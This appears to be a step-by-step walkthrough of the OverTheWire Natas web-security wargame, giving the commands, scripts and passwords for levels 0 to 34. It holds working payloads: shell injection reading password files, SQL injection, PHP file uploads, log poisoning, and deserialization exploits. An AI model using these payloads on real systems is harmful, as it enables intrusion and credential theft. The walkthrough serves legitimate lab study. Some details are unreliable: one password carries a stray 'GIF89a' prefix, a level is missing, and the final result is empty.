---
title: "OverTheWire Natas — Complete Step-by-Step Walkthrough"
description: "A walkthrough of the Natas web security wargame, combining the original level-by-level Markdown notes with commands, payloads, explanations, and recorded results."
date: 2026-11-15
tags: ["overthewire", "natas", "web-security", "ctf"]
---

## Contents

- [Natas 0 → 1](#natas-0--1)
- [Natas 1 → 2](#natas-1--2)
- [Natas 2 → 3](#natas-2--3)
- [Natas 3 → 4](#natas-3--4)
- [Natas 4 → 5](#natas-4--5)
- [Natas 5 → 6](#natas-5--6)
- [Natas 6 → 7](#natas-6--7)
- [Natas 7 → 8](#natas-7--8)
- [Natas 8 → 9](#natas-8--9)
- [Natas 9 → 10](#natas-9--10)
- [Natas 10 → 11](#natas-10--11)
- [Natas 11 → 12](#natas-11--12)
- [Natas 12 → 13](#natas-12--13)
- [Natas 13 → 14](#natas-13--14)
- [Natas 14 → 15](#natas-14--15)
- [Natas 15 → 16](#natas-15--16)
- [Natas 16 → 17](#natas-16--17)
- [Natas 17 → 18](#natas-17--18)
- [Natas 18 → 19](#natas-18--19)
- [Natas 19 → 20](#natas-19--20)
- [Natas 20 → 21](#natas-20--21)
- [Natas 21 → 22](#natas-21--22)
- [Natas 22 → 23](#natas-22--23)
- [Natas 23 → 24](#natas-23--24)
- [Natas 24 → 25](#natas-24--25)
- [Natas 25 → 26](#natas-25--26)
- [Natas 26 → 27](#natas-26--27)
- [Natas 28 → 29](#natas-28--29)
- [Natas 29 → 30](#natas-29--30)
- [Natas 30 → 31](#natas-30--31)
- [Natas 31 → 32](#natas-31--32)
- [Natas 32 → 33](#natas-32--33)
- [Natas 33 → 34](#natas-33--34)

---

## Natas 0 → 1

### Objective

Read the password displayed in the page's source.

### Observation

The password is embedded inside an HTML comment.

### Step-by-step solution

```bash
curl -u natas0:natas0 http://natas0.natas.labs.overthewire.org/
```

### Why it works

HTML comments are hidden in the rendered page but remain visible in the HTTP response source.

### Result

Password for `natas1`:

```text
scfWG6qNEIdzqVyfRwEGXyNUfFZkZeQ7
```


---

## Natas 1 → 2

### Objective

Inspect the page source even though right-click is disabled.

### Observation

JavaScript prevents opening the right-click menu, but the HTML still contains a comment with the password.

### Step-by-step solution

```bash
curl -u natas1:<password> http://natas1.natas.labs.overthewire.org/
```

### Why it works

Disabling the context menu only affects the browser's UI; it does not secure the HTML source.

### Result

Password for `natas2`:

```text
vsDOxoXyq3wckCP1ZmTZ71ngIA606odB
```


---

## Natas 2 → 3

### Objective

Find an exposed file under the web root.

### Observation

The HTML/source points toward `/files`; `users.txt` contains the password.

### Step-by-step solution

```bash
curl -u natas2:<password> http://natas2.natas.labs.overthewire.org/files/users.txt
```

### Why it works

The file is served from the web root without a separate access-control check.

### Result

Password for `natas3`:

```text
K30JrSRHzjxq3paUQuwozY4MNvmNFyhI
```


---

## Natas 3 → 4

### Objective

Find a directory excluded from search-engine crawlers.

### Observation

`robots.txt` disallows `/s3cr3t/`, where `users.txt` is stored.

### Step-by-step solution

```bash
curl -u natas3:<password> http://natas3.natas.labs.overthewire.org/robots.txt
curl -u natas3:<password> http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
```

### Why it works

`robots.txt` is not an access-control mechanism and can disclose sensitive paths.

### Result

Password for `natas4`:

```text
JDrPnuZAKyl6MkiqQGFIddrqpvgOASth
```


---

## Natas 4 → 5

### Objective

Bypass the HTTP Referer check.

### Observation

The server grants access when the Referer points to the Natas 5 website.

### Step-by-step solution

```bash
curl -u natas4:<password> -H "Referer: http://natas5.natas.labs.overthewire.org/" http://natas4.natas.labs.overthewire.org/
```

### Why it works

The Referer header is provided by the client and can be forged.

### Result

Password for `natas5`:

```text
e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M
```


---

## Natas 5 → 6

### Objective

Bypass a client-controlled cookie check.

### Observation

Setting `loggedin=1` makes the request succeed.

### Step-by-step solution

```bash
curl -u natas5:<password> -H "Cookie: loggedin=1" http://natas5.natas.labs.overthewire.org/
```

### Why it works

The application trusts a cookie value controlled by the client.

### Result

Password for `natas6`:

```text
7mhjtShJAcld2NYbKHEadnhEwRn2P8VT
```


---

## Natas 6 → 7

### Objective

Retrieve the secret from an exposed PHP include file.

### Observation

The page source reveals `includes/secret.inc`, which contains `$secret = "FOEIUWGHFEEUHOFUOIU"`.

### Step-by-step solution

```bash
curl -u natas6:<password> http://natas6.natas.labs.overthewire.org/includes/secret.inc
curl -u natas6:<password> -d "secret=FOEIUWGHFEEUHOFUOIU&submit=1" http://natas6.natas.labs.overthewire.org/
```

### Why it works

An include file located under the web root can be requested directly.

### Result

Password for `natas7`:

```text
B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0
```


---

## Natas 7 → 8

### Objective

Read a local file through a Local File Inclusion (LFI) flaw.

### Observation

The password appears in the response when `page` is set to `/etc/natas_webpass/natas8`.

### Step-by-step solution

```bash
curl -u natas7:<password> "http://natas7.natas.labs.overthewire.org/?page=/etc/natas_webpass/natas8"
```

### Why it works

The application uses an unvalidated user-controlled path to read a file.

### Result

Password for `natas8`:

```text
ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc
```


---

## Natas 8 → 9

### Objective

Recover an encoded secret from the source code.

### Observation

The source uses `bin2hex(strrev(base64_encode(secret)))`; reverse these operations in the opposite order.

### Step-by-step solution

```bash
python3 -c "import base64; e=bytes.fromhex(ENCODED); print(base64.b64decode(e[::-1]).decode())"
curl -u natas8:<password> -d "secret=<secret>&submit=1" http://natas8.natas.labs.overthewire.org/
```

### Why it works

When both the encoding method and encoded data are known, reversing the encoding requires no brute force.

### Result

Password for `natas9`:

```text
UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9
```


---

## Natas 9 → 10

### Objective

Use command injection in a search parameter.

### Observation

The `needle` value is concatenated into a `grep` shell command; `;` ends that command and starts `cat`.

### Step-by-step solution

```bash
curl -u natas9:<password> --get --data-urlencode "needle=; cat /etc/natas_webpass/natas10 #" http://natas9.natas.labs.overthewire.org/
```

### Why it works

The shell interprets unescaped input; `#` comments out the remaining command text.

### Result

Password for `natas10`:

```text
EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv
```


---

## Natas 10 → 11

### Objective

Bypass a character filter and make `grep` read the password file.

### Observation

The filter blocks some metacharacters but still allows the input to become extra `grep` arguments.

### Step-by-step solution

```bash
curl -u natas10:<password> --get --data-urlencode "needle=.* /etc/natas_webpass/natas11 #" http://natas10.natas.labs.overthewire.org/
```

### Why it works

The `.*` regular expression matches every line, and the additional path makes `grep` read the password file.

### Result

Password for `natas11`:

```text
VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd
```


---

## Natas 11 → 12

### Objective

Recover the next password by modifying an XOR-encoded cookie.

### Observation

The `data` cookie contains JSON XORed with a repeating key and Base64-encoded. Known plaintext (`showpassword=no`) can reveal the repeating key.

### Step-by-step solution

```bash
# XOR the current cookie with the known plaintext to recover the repeating key
# change showpassword=no to showpassword=yes, then XOR and Base64-encode again
curl -u natas11:<password> -H "Cookie: data=<forged-cookie>" http://natas11.natas.labs.overthewire.org/
```

### Why it works

Repeating-key XOR with structured known plaintext is vulnerable; setting `showpassword=yes` makes the server print the next password.

### Result

Password for `natas12`:

```text
EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng
```


---

## Natas 12 → 13

### Objective

Upload a PHP file that reads the next password.

### Observation

JavaScript creates a randomized filename on the client, but the server accepts the `filename` field from the request. The source notes that prepending `GIF89a` makes the file look like an image.

### Step-by-step solution

```bash
printf 'GIF89a<?php echo file_get_contents("/etc/natas_webpass/natas13"); ?>' > x.php
curl -u natas12:<password> -F "uploadedfile=@x.php;type=image/gif" -F "filename=x.php" http://natas12.natas.labs.overthewire.org/
```

### Why it works

Client-side filename checks can be changed in the request; a server that saves the `.php` extension may execute the uploaded code. `GIF89a` is emitted before the password.

### Result

Password for `natas13`:

```text
g8ba0olAzaSJuyS4gnmbdVVigAICLG1k
```


---

## Natas 13 → 14

### Objective

Bypass image validation using GIF magic bytes.

### Observation

A file beginning with `GIF89a` passes the image check while still containing PHP code.

### Step-by-step solution

```bash
printf 'GIF89a<?php echo file_get_contents("/etc/natas_webpass/natas14"); ?>' > x.php
curl -u natas13:<password> -F "uploadedfile=@x.php;type=image/gif" -F "filename=x.php" http://natas13.natas.labs.overthewire.org/
```

### Why it works

Checking the image header alone does not prevent a `.php` extension from being executed.

### Result

Password for `natas14`:

```text
GIF89aA0xXu2x9FW8rb8OSQ4ei6n5VBb
```


---

## Natas 14 → 15

### Objective

Log in using SQL injection.

### Observation

The login form concatenates the username into a SQL query.

### Step-by-step solution

```bash
curl -u natas14:<password> -d 'username=" or 1=1 #&password=x' http://natas14.natas.labs.overthewire.org/
```

### Why it works

The condition `OR 1=1` makes the predicate true, while `#` comments out the remainder of the query.

### Result

Password for `natas15`:

```text
GB6USCJYJjwLyYhZUNkE1NwDueiTow6g
```


---

## Natas 15 → 16

### Objective

Extract the Natas 16 password using blind SQL injection.

### Observation

Responses distinguish `This user exists.` from `This user doesn't exist.`; `username` is used in a SQL query.

### Step-by-step solution

```bash
curl -u natas15:<password> -X POST \
  -d 'username=natas16" AND ASCII(SUBSTRING(password,1,1)) >= 77 #' \
  http://natas15.natas.labs.overthewire.org/
```

Change the character position and ASCII threshold, using the response to binary-search each character.

### Why it works

True and false SQL predicates generate different responses, enabling character-by-character binary search.

### Result

Password for `natas16`:

```text
Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb
```


---

## Natas 16 → 17

### Objective

Extract the Natas 17 password through restricted command injection.

### Observation

The source uses `passthru("grep -i \"$key\" dictionary.txt")` and filters `; | & ` and double quotes, but leaves `$()` command substitution available.

### Step-by-step solution

```bash
curl -u natas16:<password> --get \
  --data-urlencode 'needle=$(grep -E ^<prefix> /etc/natas_webpass/natas17)' \
  http://natas16.natas.labs.overthewire.org/
```

A correct prefix makes the command substitution return the password, so the outer `grep` prints no dictionary entries. A wrong prefix makes `grep` print dictionary entries; the response length acts as an oracle.

### Why it works

The filter does not block `$()`. Testing prefixes and comparing the outer `grep` response makes the password recoverable without directly printing the file.

### Result

Password for `natas17`:

```text
KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx
```


---

## Natas 17 → 18

### Objective

Extract the Natas 18 password when query results are not displayed.

### Observation

The `username` parameter is SQL-injectable, but the page otherwise returns the same output. `SLEEP()` provides a timing signal.

### Step-by-step solution

```bash
curl -u natas17:<password> -X POST \
  -d 'username=natas18" AND IF(ASCII(SUBSTRING(password,1,1))>=77,SLEEP(3),0) #' \
  http://natas17.natas.labs.overthewire.org/
```

Use response time to binary-search the ASCII value of each character.

### Why it works

A true condition delays MySQL by three seconds; false conditions respond faster. The password need not appear in the response.

### Result

Password for `natas18`:

```text
fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op
```


---

## Natas 18 → 19

### Objective

Find an administrator session to retrieve the Natas 19 password.

### Observation

The source uses numeric `PHPSESSID` values from `1` to `640`. Logging in as `admin` sets `admin = 0` because the login check is disabled, but existing session IDs can be enumerated.

### Step-by-step solution

```python
import requests

for sid in range(1, 641):
    r = requests.post(
        'http://natas18.natas.labs.overthewire.org/',
        auth=('natas18', '<password>'),
        data={'username': 'admin', 'password': 'x'},
        cookies={'PHPSESSID': str(sid)},
    )
    if 'You are an admin' in r.text:
        print(r.text)
```

Session `119` returned the administrator information in the source write-up.

### Why it works

The server accepts a client-selected session ID and the candidate space contains only 640 values; an existing admin session can be located.

### Result

Password for `natas19`:

```text
qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT
```


---

## Natas 19 → 20

### Objective

Recover the Natas 20 password despite the changed session ID format.

### Observation

Session IDs are constructed from `<number>-<username>` and hex-encoded with `bin2hex()`; validation decodes the value and checks that structure.

### Step-by-step solution

```python
import binascii
import requests

for number in range(1, 641):
    sid = binascii.hexlify(f'{number}-admin'.encode()).decode()
    r = requests.get(
        'http://natas19.natas.labs.overthewire.org/',
        auth=('natas19', '<password>'),
        cookies={'PHPSESSID': sid},
    )
    if 'You are an admin' in r.text:
        print(sid, r.text)
```

The matching session ID was `3238312d61646d696e`, representing `281-admin`.

### Why it works

Hex encoding only obscures a predictable session ID. Constructing the correct string before hex encoding reaches the corresponding admin session.

### Result

Password for `natas20`:

```text
slOKYGsjlJhaqKliGvrgWAzln0JyrWao
```


---

## Natas 20 → 21

### Objective

Overwrite session state to retrieve the Natas 21 password.

### Observation

The application reads session data as `key value` lines; the `name` input is stored without excluding newlines.

### Step-by-step solution

```python
import requests

s = requests.Session()
s.post(
    'http://natas20.natas.labs.overthewire.org/',
    auth=('natas20', '<password>'),
    data={'name': 'admin\nadmin 1'},
)
r = s.get(
    'http://natas20.natas.labs.overthewire.org/',
    auth=('natas20', '<password>'),
)
print(r.text)
```

The response confirms `You are an admin` and reveals the next level's credentials.

### Why it works

A newline creates a new `admin 1` session line. A subsequent request with the same `PHPSESSID` loads the injected admin state.

### Result

Password for `natas21`:

```text
7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU
```


---

## Natas 21 → 22

### Objective

Obtain the Natas 22 password through an experimenter site sharing a session.

### Observation

The `natas21-experimenter` host saves POST fields into `$_SESSION`, and the main `natas21` host checks the same session for `admin = 1`.

### Step-by-step solution

```python
import requests

s = requests.Session()
auth = ('natas21', '<password>')
s.post(
    'http://natas21-experimenter.natas.labs.overthewire.org/index.php',
    auth=auth,
    data={'align': 'center', 'fontsize': '100%', 'bgcolor': 'yellow', 'admin': '1', 'submit': 'Update'},
)
r = s.get('http://natas21.natas.labs.overthewire.org/', auth=auth)
print(r.text)
```

The source write-up reports that the live response returned the next password.

### Why it works

Both virtual hosts share a session store; the experimenter can write an `admin` value the main site trusts.

### Result

Password for `natas22`:

```text
964laB0r7TuDqJj5b3HFtwsQoc0GhjBF
```


---

## Natas 22 → 23

### Objective

Retrieve the Natas 23 password from a page that redirects automatically.

### Observation

A request containing `revelio` causes the page to output credentials and then redirect to `/`.

### Step-by-step solution

```bash
curl -u natas22:<password> -i \
  'http://natas22.natas.labs.overthewire.org/?revelio=1'
```

Do not follow the redirect, or the response with the credentials may be hidden.

### Why it works

The credentials are written before the redirect; a browser that follows `Location: /` can hide that earlier response.

### Result

Password for `natas23`:

```text
CH1OBxJy8uAxMM15Nx6VXSMwcJbBbnS5
```


---

## Natas 23 → 24

### Objective

Satisfy a weak PHP comparison to retrieve the Natas 24 password.

### Observation

The source tests `strstr(passwd, "iloveyou")` and compares the string to the number `10`.

### Step-by-step solution

```bash
curl -u natas23:<password> --get \
  --data-urlencode 'passwd=11iloveyou' \
  http://natas23.natas.labs.overthewire.org/
```

### Why it works

`11iloveyou` contains the required substring, and the source's PHP version interprets its leading numeric part as `11` for the loose comparison.

### Result

Password for `natas24`:

```text
shlL4BvOtawNCd81dwdKRHFzmTEjYYQX
```


---

## Natas 24 → 25

### Objective

Exploit a type mismatch in `strcmp()` to retrieve the Natas 25 password.

### Observation

The source calls `strcmp($_REQUEST["passwd"], "<censored>")`. The supplied source reports a non-string array resulting in a falsy comparison on the challenge runtime.

### Step-by-step solution

```bash
curl -u natas24:<password> \
  'http://natas24.natas.labs.overthewire.org/?passwd[]=x'
```

### Why it works

`passwd[]` becomes a PHP array; in the challenge's legacy PHP behavior, `!strcmp(...)` evaluates as true following the type error. This behavior is version-dependent.

### Result

Password for `natas25`:

```text
UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo
```


---

## Natas 25 → 26

### Objective

Use log poisoning and local file inclusion to retrieve the Natas 26 password.

### Observation

The `lang` value reaches `include()` after weak traversal filtering. The User-Agent header is logged under the current session ID, so PHP code can be placed in a log and then included.

### Step-by-step solution

```python
import requests

s = requests.Session()
auth = ('natas25', '<password>')
ua = '<?php echo shell_exec("cat /etc/natas_webpass/natas26"); ?>'
s.get(
    'http://natas25.natas.labs.overthewire.org/',
    auth=auth,
    headers={'User-Agent': ua},
)
sid = s.cookies['PHPSESSID']
r = s.get(
    'http://natas25.natas.labs.overthewire.org/',
    auth=auth,
    headers={'User-Agent': ua},
    params={'lang': f'....//logs/natas25_{sid}.log'},
)
print(r.text)
```

The source write-up reports that the live response returned the password from the included log.

### Why it works

Removing just one `../` substring from `....//` leaves `../`. The included log then contains client-controlled User-Agent text interpreted as PHP.

### Result

Password for `natas26`:

```text
3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT
```


---

## Natas 26 → 27

### Objective

Use PHP object injection in the `drawing` cookie to obtain the Natas 27 password.

### Observation

The source calls `unserialize(base64_decode($_COOKIE["drawing"]))`. A `Logger` destructor writes `exitMsg` into `logFile`, enabling an attacker-controlled serialized object to create a `.php` file in the web root.

### Step-by-step solution

```python
import base64
import requests

s = requests.Session()
auth = ('natas26', '<password>')
s.get('http://natas26.natas.labs.overthewire.org/', auth=auth)
sid = s.cookies['PHPSESSID']
path = f'img/natas26_{sid}.php'
payload = "<?php readfile('/etc/natas_webpass/natas27'); ?>"
serialized = (
    f'O:6:"Logger":3:{{'
    f's:15:"\\x00Logger\\x00logFile";s:{len(path)}:"{path}";'
    f's:15:"\\x00Logger\\x00initMsg";s:0:"";'
    f's:15:"\\x00Logger\\x00exitMsg";s:{len(payload)}:"{payload}";}}'
).replace('\\x00', '\\x00')
cookie = base64.b64encode(serialized.encode()).decode()
s.get(
    'http://natas26.natas.labs.overthewire.org/',
    auth=auth,
    params={'x1': '1', 'y1': '1', 'x2': '2', 'y2': '2'},
    cookies={'drawing': cookie},
)
r = s.get(f'http://natas26.natas.labs.overthewire.org/{path}', auth=auth)
print(r.text)
```

The source write-up reports that the live response returned the Natas 27 password.

### Why it works

Untrusted deserialization creates an object whose destructor writes an attacker-chosen PHP payload. Requesting the generated `.php` file triggers execution.

### Result

Password for `natas27`:

```text
mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV
```


---

## Natas 28 → 29

### Objective

Recover the Natas 29 password from the jokes database.

### Observation

POSTing `query` produces a Base64 ciphertext in `/search.php/?query=`. Repeated 16-byte blocks suggest ECB encryption, and the server's SQL query has a fixed prefix.

### Step-by-step solution

1. Choose the SQL-injection fragment used in the source:

```python
payload = "' UNION SELECT password FROM users #"
```

2. Add nine padding characters so the payload begins on the intended cipher-block boundary.

3. Reuse ciphertext blocks associated with the injected portion and splice them into an otherwise valid encrypted query.

**Original source limitation:** The file provides the strategy and final output but not a full executable ECB block-splicing script.
### Why it works

ECB encrypts blocks independently, so ciphertext blocks carrying the SQL-injection fragment can be spliced into another encrypted request without knowing the key.

### Result

The server response (and recovered Natas 29 password) was:

```text
hwgoYUiGWoSZAqphtCAZf7u1jS16KEah
```


---

## Natas 29 → 30

### Objective

Read the Natas 30 password through Perl's `open()` in a CGI script.

### Observation

The page accepts `file`, and `open(FD, "$f.txt")` supports pipe syntax. A literal `natas` substring is blocked, but shell wildcard `?` can replace its `a` characters.

### Step-by-step solution

```text
http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20/etc/n?tas_webpass/n?tas30%00
```

`%00` terminates the filename for the Perl `open()` call in the source's challenge environment. The `cat` output appears in the response.

### Why it works

A leading `|` makes Perl `open()` use a command pipe; the literal filter misses the wildcard-expanded path. The source uses `%00` to terminate the appended filename.

### Result

Password for `natas30`:

```text
frO4U4zCfVJXq2zG5HSVNjA46nQGzoqF
```

The source write-up reports successful Basic Authentication on the next level.


---

## Natas 30 → 31

### Objective

Bypass a Perl login check to get the Natas 31 password.

### Observation

The source builds SQL using `DBI->quote(param('username'))` and `DBI->quote(param('password'))`. Repeated CGI parameters can create a list, and `quote()` accepts an optional SQL type argument.

### Step-by-step solution

```python
requests.post(
    'http://natas30.natas.labs.overthewire.org/index.pl',
    auth=('natas30', '<current-password>'),
    data=[('username', 'natas30'), ('password', '0 OR 1=1'), ('password', '4')]
)
```

The source reports that the response contained `win!` and the Natas 31 password.

### Why it works

The duplicate `password` parameters cause `quote()` to receive `4` as an `SQL_INTEGER` type flag, so `0 OR 1=1` is not quoted as a string.

### Result

The successful response returned the Natas 31 password:

```text
aQzrirxwd2Wiaoq8HnSjcc8IUWlxdd1z
```

The source write-up reports successful Basic Authentication on the next level.


---

## Natas 31 → 32

### Objective

Use Perl's diamond operator to read the Natas 32 password.

### Observation

The CSV2HTML script checks `upload('file')` but uses `$cgi->param('file')` in `while (<$file>)`. Multiple fields of the same name and Perl's special `ARGV` handle let the query string become input to the diamond operator.

### Step-by-step solution

```text
POST /index.pl?cat%20/etc/natas_webpass/natas32%20%7C
Content-Type: multipart/form-data

file=ARGV
file=@test.csv
```

```csv
name,value
probe,123
```

The response placed the Natas 32 password in the first cell of the resulting table.

### Why it works

The first `file=ARGV` is used by `param()`, whereas `upload()` finds the second field. The diamond operator interprets the query-string-supplied pipe command as an input source.

### Result

The response returned the Natas 32 password:

```text
Rc3837d6qd3KoW0R2IgKssMXRX06btgY
```

The source write-up reports successful Basic Authentication on the next level.


---

## Natas 32 → 33

### Objective

Execute the setuid binary in the web root to obtain the Natas 33 password.

### Observation

Natas 32 uses the same CSV2HTML/Perl `ARGV` behavior. Listing `/var/www/natas/natas32` reveals `getpassword`, a root-owned binary with the setuid bit set.

### Step-by-step solution

```text
POST /index.pl?%2Fvar%2Fwww%2Fnatas%2Fnatas32%2Fgetpassword%20%7C

file=ARGV
file=@x.csv
```

```csv
h1,h2
a,b
```

The setuid binary printed the Natas 33 password.

### Why it works

The `ARGV` pipe invokes that binary; running with setuid privileges lets it print the next level's password.

### Result

The binary returned the Natas 33 password:

```text
kmIpGpPfpBF529wy1C8FGb9ZSO7fTlKL
```

The source write-up reports successful Basic Authentication on the next level.


---

## Natas 33 → 34

### Objective

Bypass the Natas 33 firmware verification to run a PHP payload and retrieve the Natas 34 password.

### Observation

The source creates an `Executor` and its destructor calls `md5_file($this->filename)`, loosely compares the result with `$signature`, and executes `php $this->filename` when it matches. The source describes PHAR metadata that can instantiate a malicious `Executor`.

### Step-by-step solution

1. Upload the following file as `payload.php`:

```php
<?php
echo "NATAS33_PROBE:" . file_get_contents('/etc/natas_webpass/natas34') . ":END";
?>
```

2. Create a PHAR with `Executor` metadata using `filename='payload.php'` and `signature=true`; upload it as `natas33.phar`.

3. Make a file upload request with the POST field `filename` set to:

```text
phar://natas33.phar/stub.txt
```

4. In the challenge runtime described by the source, `md5_file()` resolves the PHAR path, object metadata is deserialized, and the destructor triggers the uploaded PHP payload.

**Original source limitation:** No full PHAR generation code was included in the archive.
### Why it works

The `phar://` stream wrapper is used with `md5_file()` to deserialize object metadata in the challenge environment. A boolean `true` signature passes a loose comparison with a nonempty hash, allowing the destructor to execute the uploaded PHP file.

### Result

The response returned the following marker and password:


The source write-up reports successful authentication to Natas 34, whose page displayed: `Congratulations! You have reached the end... for now.`

